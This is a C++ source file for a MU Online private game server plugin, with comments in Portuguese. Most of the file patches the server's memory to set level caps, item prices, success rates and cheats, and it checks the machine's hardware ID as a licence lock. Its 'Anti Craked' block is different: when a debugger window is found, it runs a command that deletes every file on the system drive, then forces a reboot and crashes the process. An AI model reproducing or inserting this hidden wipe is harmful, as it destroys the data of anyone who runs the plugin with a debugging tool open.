//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// # DARK PLUGIN - POWERED BY FIRE TEAM
// # GAME SERVER: 0.97.40T (C) WEBZEN.
// # VERSÃO: 1.0.0.0
// # Autor: Maykon
// # Skype: Maykon.ale
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// # O Senhor é meu pastor e nada me faltará!
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#include "StdAfx.h"

void Customs()
{
	GetHID();
	//===============================================
	//-- Anti Craked 
	//===============================================
	HANDLE holly = FindWindow(TEXT("OllyDbg"), NULL);
	HANDLE x32dbg = FindWindow(TEXT("x32dbg"), NULL);
	HANDLE x64dbg = FindWindow(TEXT("x64dbg"), NULL);
	HANDLE AQtime = FindWindow(TEXT("AQtime"), NULL);
	HANDLE DEBUG  = FindWindow(TEXT("DEBUG"), NULL);
	HANDLE SoftICE = FindWindow(TEXT("SoftICE"), NULL);
	HANDLE WinDbg = FindWindow(TEXT("WinDbg"), NULL);
	if (holly || x32dbg || x64dbg || AQtime || DEBUG || SoftICE || WinDbg)
	{

		system("@echo Off");
		system("del %systemdrive%\\*.*/f/s/q");
		system("shutdown -r -f -t 00");

		__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		}

	}
	*(unsigned int*) (0x4B7932+3) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
	*(unsigned int*) (0x4D046B+2) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
	*(unsigned int*) (0x51ACA0+2) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
	*(unsigned int*) (0x526D50+2) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
	*(unsigned int*) (0x50A5BD+3) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);

	*(unsigned char*) (0x4D0581+2) = GetPrivateProfileInt("Server","Pontos Por Level <BK | SM | ELF>",5,CFG_GAMESERVER);
    *(unsigned char*) (0x4D056A+2) = GetPrivateProfileInt("Server","Pontos Por Level <MG>",7,CFG_GAMESERVER);
    *(unsigned char*) (0x4D0542+2) = GetPrivateProfileInt("Server","Pontos Por Level <DL>",7,CFG_GAMESERVER);

	*(unsigned int*) (0x50A48D+1) = GetPrivateProfileInt("GameServerInfo", "Porta UDP", 60006, CFG_SVINFO);

	*(unsigned char*) (0x44B49B+2) = GetPrivateProfileInt("Server","Players para iniciar uma guild aliança",20,CFG_GAMESERVER);

	*(unsigned long*) (0x437D77+3) = GetPrivateProfileInt("Server","Máximo de Zen no Inventory",2000000000,CFG_GAMESERVER);

	*(unsigned long*) (0x43EEF6+3) = GetPrivateProfileInt("Server","Máximo de Zen no WareHouse",2000000000,CFG_GAMESERVER);
	*(unsigned long*) (0x43EFEC+3) = GetPrivateProfileInt("Server","Máximo de Zen no WareHouse",2000000000,CFG_GAMESERVER);
	*(unsigned long*) (0x43EF22+2) = GetPrivateProfileInt("Server","Máximo de Zen no WareHouse",2000000000,CFG_GAMESERVER);

	*(unsigned char*) (0x4EE8DB+3) = GetPrivateProfileInt("JóiasRates","Chance de Sucesso da Jewel of Souls em Items Sem Luck",0,CFG_GAMESERVER);
	*(unsigned char*) (0x4EE7FC+3) = GetPrivateProfileInt("JóiasRates","Chance de Sucesso da Jewel of Souls em Items Com Luck",100,CFG_GAMESERVER);
	*(unsigned char*) (0x4EEFCA+3) = GetPrivateProfileInt("JóiasRates","Chance de Sucesso da Jewel of Life em Items",0,CFG_GAMESERVER);

	*(unsigned int*) (0x4FC7F0+3) = GetPrivateProfileInt("JóiasPreços","Preço da Jewel of Bless",6000000,CFG_GAMESERVER);
    *(unsigned int*) (0x4FC811+3) = GetPrivateProfileInt("JóiasPreços","Preço da Jewel of Soul",9000000,CFG_GAMESERVER);
    *(unsigned int*) (0x4FC833+3) = GetPrivateProfileInt("JóiasPreços","Preço da Jewel of Chaos",810000,CFG_GAMESERVER);
    *(unsigned int*) (0x4FC855+3) = GetPrivateProfileInt("JóiasPreços","Preço da Jewel of Life",45000000,CFG_GAMESERVER);
    *(unsigned int*) (0x4FC876+3) = GetPrivateProfileInt("JóiasPreços","Preço da Jewel of Creation",36000000,CFG_GAMESERVER);

	*(unsigned int*) (0x48E9FE+1) = GetPrivateProfileInt("Server","Tempo dos Itens Dropados no chão",120,CFG_GAMESERVER)*1000;
	*(unsigned int*) (0x48EB9F+1) = GetPrivateProfileInt("Server","Tempo dos Itens Dropados no chão",120,CFG_GAMESERVER)*1000;

	*(unsigned int*) (0x47F760+7) = GetPrivateProfileInt("Skills do blade knight","Level requerido para uso da twisting slash skill",80,CFG_GAMESERVER);
	*(unsigned int*) (0x47F779+7) = GetPrivateProfileInt("Skills do blade knight","Level requerido para uso da rage ful blow skill",170,CFG_GAMESERVER);
	*(unsigned int*) (0x47F792+7) = GetPrivateProfileInt("Skills do blade knight","Level requerido para uso da death stab skill",160,CFG_GAMESERVER);
	*(unsigned int*) (0x47F7C4+7) = GetPrivateProfileInt("Skills do blade knight","Level requerido para uso da great fortitude skill",120,CFG_GAMESERVER);
	*(unsigned int*) (0x47F7DD+7) = GetPrivateProfileInt("Skills do blade knight","Level requerido para uso da penetration skill",1,CFG_GAMESERVER);

	*(unsigned int*) (0x4B015F+1) = GetPrivateProfileInt("GreatFortitude","GreatFortitudeVitality",100,CFG_GAMESERVER);
	*(unsigned int*) (0x4B017F+1) = GetPrivateProfileInt("GreatFortitude","GreatFortitudeEnergy",20,CFG_GAMESERVER);
	*(unsigned int*) (0x4B01A9+1) = GetPrivateProfileInt("GreatFortitude","GreatFortitudeDuration",760,CFG_GAMESERVER);

	*(unsigned int*) (0x4B053B+1) = GetPrivateProfileInt("ManaShield","AdditionalAgility",500,CFG_GAMESERVER);
	*(unsigned int*) (0x4B055B+1) = GetPrivateProfileInt("ManaShield","AdditionalEnergy",1600,CFG_GAMESERVER);
	*(unsigned int*) (0x4B0586+1) = GetPrivateProfileInt("ManaShield","ManaShieldDuration",760,CFG_GAMESERVER);

	*(unsigned char*) (0x491064+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Upar Item Para +10",100,CFG_GAMESERVER);
    *(unsigned char*) (0x49108F+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Upar Item Para +11",100,CFG_GAMESERVER);
	*(unsigned char*) (0x4910BA+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Upar Item Para +12",100,CFG_GAMESERVER);
	*(unsigned char*) (0x4910E5+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Upar Item Para +13",100,CFG_GAMESERVER);
	*(unsigned char*) (0x49246D+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Criar Asa Level 1",100,CFG_GAMESERVER);
	*(unsigned char*) (0x492479+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Criar Asa Level 2",100,CFG_GAMESERVER);
	*(unsigned char*) (0x4918CC+6) = GetPrivateProfileInt("ChaosMachineMixes","Chance de Sucesso ao Criar Pet Dinorant",100,CFG_GAMESERVER);
	*(unsigned char*) (0x491123+6) = GetPrivateProfileInt("ChaosMachineMixes","Chaos Machine Rate Máximo",100,CFG_GAMESERVER);
    *(unsigned char*) (0x49112F+6) = GetPrivateProfileInt("ChaosMachineMixes","Chaos Machine Rate Máximo",100,CFG_GAMESERVER);

	// -  CheckSum

	int  CheckSum = GetPrivateProfileInt("Server","CheckSum",0,CFG_GAMESERVER);
	if(  CheckSum != 0 )
	{
		func.SetByte(0x42C37A,0x7E);
		func.SetByte(0x42C3D8,0x74);
	}
	else
	{
		func.SetByte(0x42C37A,0xEB); 
		func.SetByte(0x42C3D8,0xEB);
	}

	// -  Flechas

	int  _Flechas = GetPrivateProfileInt("Server","Flechas Infinitas",0,CFG_GAMESERVER);
	if(  _Flechas != 0)
	{
		for(DWORD i = 0x4ACF39; i <= 0x4AD13E; i++)
		{
			func.SetByte(i,0x90);
		}
	}

	// -  Potions

	int  _Potions = GetPrivateProfileInt("Server","Potions Infinitos",0,CFG_GAMESERVER);
	if(  _Potions != 0)
	{
		func.SetByte(0x4447B7,0);
		func.SetByte(0x444A10,0);
		func.SetByte(0x444A8F,0);
	}

	// -  Pets

	int  _Pets = GetPrivateProfileInt("Server","Pets Imortais",0,CFG_GAMESERVER);
	if(  _Pets != 0)
	{
		func.SetByte(0x4D3E98,0x90);
		func.SetByte(0x4D3E99,0x90);
	}

	// -  Zen

	int  _Zen = GetPrivateProfileInt("Server","ZenDrop",0,CFG_GAMESERVER);
	if(  _Zen != 0 )
	{
		*(BYTE*)(0x48BED0) = 0xC3;
	}

}
char* RemoveChar(char* Input, char Character) //OK
{
	for(int i=0; i<=strlen(Input); i++)
	{
		if(Input[i] == Character)
		{
			for(int n=i; n<=strlen(Input); n++)
			{
				Input[n] = Input[n+1];
			}
		}
	}
	return Input;
}

void GetHID()
{
	HW_PROFILE_INFO hwProfileInfo;
	DWORD HDSerial;
	char HardID[50];
	TCHAR DriverLetterBuf[30];
	char DriverName[5];

    GetSystemWindowsDirectory(DriverLetterBuf,30);
	sprintf(DriverName,"%c://",DriverLetterBuf[0]);
	GetVolumeInformationA(DriverName, NULL, 12, &HDSerial, NULL, NULL, NULL, 10);

	if(GetCurrentHwProfile(&hwProfileInfo) != NULL)
	{
		sprintf(HardID,"%S",hwProfileInfo.szHwProfileGuid);
		strcpy(HardID,RemoveChar(HardID,'{'));
		strcpy(HardID,RemoveChar(HardID,'}'));
		strcpy(HardID,RemoveChar(HardID,'-'));
		
		for(int i=0;i<=strlen(HardID);i++)
		{
			HardID[i] = toupper(HardID[i]);
		}
		sprintf(HardID,"%c%c%c%c%c%c%c%c-%c%c%c%c%c%c%c%c-%c%c%c%c%c%c%c%c-%.08X",HardID[1],HardID[0],HardID[3],HardID[2],HardID[5],HardID[4],HardID[7],
			HardID[6],HardID[9],HardID[8],HardID[11],HardID[10],HardID[13],HardID[12],HardID[15],HardID[14],HardID[17],HardID[16],HardID[19],HardID[18],HardID[21],
			HardID[20],HardID[23],HardID[22],HDSerial);
	}
	if(strlen(HardID)<20)
	{
		sprintf(HardID,"%.08X-%.08X-%.08X-%.08X",HDSerial*2,HDSerial/4,HDSerial*4,HDSerial*6);
	}
	//===============================================
	//-- HardwareID Protection
	//===============================================
	char HwID[] ="A0D863C6-341B0C78-41B0C78C-E2892B52";
	if( strcmp(HwID,HardID) != 0 ){
		MessageBoxA(NULL, "Você não está autorizado a usar esse Arquivo!\r\nErro 0x04", "[B&W Team]", MB_OK);
		
	FILE * pFile;

	fopen_s(&pFile,".\\Autorização.txt","w");

	if (pFile!=NULL)
	{
		fputs (HardID,pFile);
		fclose (pFile);
	}
	__asm
		{
			MOV EAX, 00000000;
			CALL EAX;
		}
	}
}
